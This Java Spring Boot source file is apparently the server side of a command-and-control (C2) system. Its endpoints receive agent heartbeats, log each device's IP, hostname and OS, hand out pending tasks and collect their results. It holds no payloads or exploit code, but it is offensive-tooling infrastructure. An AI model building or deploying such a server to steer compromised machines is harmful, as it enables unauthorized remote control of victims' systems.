package com.yupi.springbootinit.controller;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.yupi.springbootinit.common.BaseResponse;
import com.yupi.springbootinit.common.ResultUtils;
import com.yupi.springbootinit.mapper.C2TaskMapper;
import com.yupi.springbootinit.mapper.C2DeviceMapper;
import com.yupi.springbootinit.model.entity.C2Task;
import com.yupi.springbootinit.model.entity.C2Device;
import com.yupi.springbootinit.utils.NetUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * C2 Controller (Agent Communication)
 */
@RestController
@Slf4j
public class C2Controller {

    @Resource
    private C2TaskMapper c2TaskMapper;

    @Resource
    private C2DeviceMapper c2DeviceMapper;

    @PostMapping("/heartbeat")
    public String heartbeat(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
        // Record heartbeat
        recordHeartbeat(payload, request);
        return "alive";
    }

    @GetMapping("/c2/tasks/pending")
    public List<C2Task> getPendingTasks(HttpServletRequest request) {
        // Record heartbeat (legacy support or just ip)
        C2Device device = recordHeartbeat(null, request);
        
        QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("status", "pending");
        // Filter by deviceId if possible, or broadcast (deviceId is null)
        if (device != null) {
            queryWrapper.and(qw -> qw.eq("deviceId", device.getId()).or().isNull("deviceId"));
        } else {
             queryWrapper.isNull("deviceId");
        }
        return c2TaskMapper.selectList(queryWrapper);
    }

    @PostMapping("/c2/tasks/result")
    public BaseResponse<Boolean> submitTaskResult(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
        recordHeartbeat(null, request);
        String taskId = (String) payload.get("taskId");
        String result = (String) payload.get("result");

        if (taskId != null) {
            QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
            queryWrapper.eq("taskId", taskId);
            C2Task task = c2TaskMapper.selectOne(queryWrapper);
            if (task != null) {
                task.setResult(result);
                task.setStatus("completed");
                c2TaskMapper.updateById(task);
            }
        }
        return ResultUtils.success(true);
    }
    
    // Helper to record heartbeat from request
    private C2Device recordHeartbeat(Map<String, Object> payload, HttpServletRequest request) {
        String ip = NetUtils.getIpAddress(request);
        String hostName = "Unknown";
        String os = "Unknown";
        
        if (payload != null) {
            if (payload.containsKey("hostName")) {
                hostName = (String) payload.get("hostName");
            }
            if (payload.containsKey("os")) {
                os = (String) payload.get("os");
            }
            // Use client reported IP if provided, otherwise stick to request IP
             if (payload.containsKey("ip")) {
                // ip = (String) payload.get("ip"); 
             }
        }

        // Simple identification by IP for now since client is anonymous
        QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("ip", ip);
        C2Device device = c2DeviceMapper.selectOne(queryWrapper);
        if (device == null) {
            device = new C2Device();
            device.setIp(ip);
            device.setHostName(hostName);
            device.setOs(os);
            device.setLastSeen(new Date());
            c2DeviceMapper.insert(device);
        } else {
            device.setLastSeen(new Date());
            // Update info if it was unknown before or changed
            if (!"Unknown".equals(hostName)) {
                device.setHostName(hostName);
            }
            if (!"Unknown".equals(os)) {
                device.setOs(os);
            }
            c2DeviceMapper.updateById(device);
        }
        return device;
    }
}

